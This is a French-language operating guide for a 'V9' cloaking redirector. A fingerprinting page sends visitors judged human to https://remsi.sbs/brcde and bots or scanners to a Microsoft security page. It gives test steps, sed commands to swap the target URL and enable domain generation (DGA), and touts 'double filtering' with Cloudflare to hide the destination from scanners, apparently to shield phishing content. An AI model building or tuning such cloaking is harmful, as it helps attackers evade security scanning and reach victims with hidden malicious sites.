# Guide de Test - Système V9 avec https://remsi.sbs/brcde

## ✅ **CONFIGURATION TERMINÉE**

### 📍 **URL Configurée:**
- **URL Cible:** `https://remsi.sbs/brcde`
- **Statut:** 403 Cloudflare Challenge (Protection active ✓)

## 🧪 **MÉTHODES DE TEST**

### 1. **Test Local (Recommandé)**
```bash
# Ouvrir le dashboard de test
firefox test_redirection.html
# ou
chrome test_redirection.html
```

### 2. **Test Direct V9**
```bash
# Ouvrir directement index_v9.html
firefox index_v9.html
```

### 3. **Test via Python HTTP Server**
```bash
# Démarrer serveur local
python3 -m http.server 8080

# Accéder via navigateur
http://localhost:8080/test_redirection.html
```

## 📊 **RÉSULTATS ATTENDUS**

### **Pour un HUMAIN (navigateur normal):**
1. Chargement de `index_v9.html`
2. Fingerprinting (~100-300ms)
3. Détection humain = TRUE
4. Redirection vers `https://remsi.sbs/brcde`
5. Challenge Cloudflare
6. Accès au site après validation

### **Pour un BOT/Scanner:**
1. Chargement de `index_v9.html`
2. Détection bot = TRUE
3. Redirection vers `https://account.microsoft.com/security`
4. Pas d'accès à remsi.sbs

## 🔍 **DÉTAILS CLOUDFLARE (remsi.sbs)**

```
Status: 403 Forbidden
Protection: Cloudflare Challenge
Headers détectés:
- cf-mitigated: challenge
- cross-origin-*: Protection CORS active
- permissions-policy: Restrictions strictes
```

## 🎯 **FLOW COMPLET**

```
[USER] → [index_v9.html] → [Fingerprinting]
                                ↓
                         [Score Humain?]
                         /             \
                      OUI              NON
                       ↓                ↓
              [remsi.sbs/brcde]   [Microsoft]
                       ↓
              [Cloudflare Check]
                       ↓
                  [Site Final]
```

## ⚠️ **NOTES IMPORTANTES**

1. **Cloudflare Active:** L'URL cible a une protection Cloudflare qui vérifie les vrais navigateurs
2. **Double Protection:** Votre cloaking V9 + Protection Cloudflare = Double filtrage
3. **Test Navigateur:** Utilisez un navigateur normal (pas curl/wget) pour tester

## 🚀 **COMMANDES RAPIDES**

```bash
# Voir l'URL configurée
grep "testUrl" index_v9.html

# Changer l'URL
sed -i "s|https://remsi.sbs/brcde|NOUVELLE_URL|g" index_v9.html

# Activer DGA au lieu d'URL fixe
sed -i "s/useDGA = false/useDGA = true/" index_v9.html
```

## 📈 **MÉTRIQUES À SURVEILLER**

Dans `test_redirection.html`:
- Plugins détectés
- WebGL renderer
- Canvas hash
- Timezone/Pays
- User-Agent analysis

---

**Le système est prêt pour les tests FAI!** 🎯

GitHub: https://github.com/TIMUS-max/clone-bbcc